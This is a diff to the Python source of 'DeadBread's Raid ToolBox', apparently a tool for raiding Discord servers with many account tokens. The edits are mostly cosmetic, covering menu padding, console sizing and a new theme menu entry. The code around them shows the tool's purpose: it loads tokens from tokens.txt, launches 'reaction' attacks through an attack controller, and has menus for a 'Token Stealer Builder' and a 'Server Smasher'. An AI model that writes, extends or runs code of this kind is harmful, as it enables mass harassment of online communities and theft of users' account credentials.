@@ -16,6 +16,12 @@
 # WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
 # OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 # CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+#
+#
+# Note for people taking/using code:
+# I don't mind if you use RTB as a "Reference" to help you code your own programs,
+# But please DO NOT blatantly take code from RTB and say it is your own.
+
 
 rtbversion = "1.0.2b"
 smversion = "0.1.11r1"
@@ -686,15 +692,10 @@ def main(currentattacks):
     global disable_update_check
     global server_smasher_in_main_window
     global ignore_ffmpeg_missing
-    if sys.platform.startswith('win32'):
-        os.system('mode con:cols=100 lines=30')
-    else:
-        os.system("printf '\033[8;30;100t'")
+    clear()
     with open('tokens.txt','r') as handle:
         line = handle.readlines()
         tcounter = len(line)
-    now = datetime.datetime.now()
-    clear()
     if sys.platform.startswith('win32'):
         if "b" in rtbversion:
             ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox v{} (TEST VERSION)".format(rtbversion))
@@ -705,14 +706,6 @@ def main(currentattacks):
             sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox v{} (TEST VERSION)\x07".format(rtbversion))
         else:
             sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox v{}\x07".format(rtbversion))
-    if len(str(tcounter)) == 1:
-        menublank = "    "
-    if len(str(tcounter)) == 2:
-        menublank = "   "
-    if len(str(tcounter)) == 3:
-        menublank = "  "
-    if len(str(tcounter)) == 4:
-        menublank = " "
     if no_tk_mode == 1:
         if sys.platform.startswith('win32'):
             os.system('mode con:cols=41 lines=32')
@@ -751,7 +744,7 @@ def main(currentattacks):
         print(colored("25. Token options",menu2))
         choice = input(colored(">",menu2))
     elif command_line_mode == 0:
-        menu_def = [['RTB', ['Attack Manager', 'Themes',['Change Theme', 'Theme Repo'], 'About', ['Info', 'Diagnostics', 'Updater', 'Settings']]],
+        menu_def = [['RTB', ['Attack Manager', 'Themes',['Change Theme', 'Theme Repo', 'Theme Creator'], 'About', ['Info', 'Diagnostics', 'Updater', 'Settings']]],
                     ['Tokens', ['View/Add Tokens', 'Token Stealer Builder', 'Token Toolkit']],
                     ['Help', ['Wiki', 'My YouTube', 'Discord Server', 'Telegram']],
                     ['Server Smasher', ['Launch']],
@@ -1285,6 +1278,21 @@ def main(currentattacks):
                 p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','reaction',sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
                 currentattacks["Reaction | Started at: {}".format(datetime.datetime.now().time())] = p.pid
     else:
+        now = datetime.datetime.now()
+        if len(str(tcounter)) == 1:
+            menublank = "    "
+        elif len(str(tcounter)) == 2:
+            menublank = "   "
+        elif len(str(tcounter)) == 3:
+            menublank = "  "
+        elif len(str(tcounter)) == 4:
+            menublank = " "
+        else:
+            menublank = ""
+        if sys.platform.startswith('win32'):
+            os.system('mode con:cols=100 lines=30')
+        else:
+            os.system("printf '\033[8;30;100t'")
         print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menu1))
         print (colored("██                                                                                                ██",menu1))
         if singlefile == True:
